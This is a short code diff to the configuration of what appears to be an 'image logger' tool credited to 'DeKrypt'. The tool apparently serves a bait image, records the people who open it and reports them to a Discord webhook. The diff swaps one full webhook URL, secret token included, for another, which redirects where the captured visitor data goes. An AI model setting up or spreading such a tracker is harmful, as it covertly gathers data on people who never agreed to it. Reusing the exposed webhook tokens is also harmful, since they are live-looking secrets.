@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://ptb.discord.com/api/webhooks/1446163964856762398/IbDKuDiIRJDSGmaCkW6vykQOy6EupVxaNe8Cf-Vk2hysCrpFa7SKxrF5fmAttmfxJfWs",
+    "webhook": "https://ptb.discord.com/api/webhooks/1446167387148648549/FsZd7gSnEUaLpAjP5EBtTIYV99prBbu753KoWzMTdZRB2DaQvkDYAuPsfwFmOqnNWnRE",
     "image": "https://genetic.by/templates/ice_future/images/page-other/v-pig-1.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
 
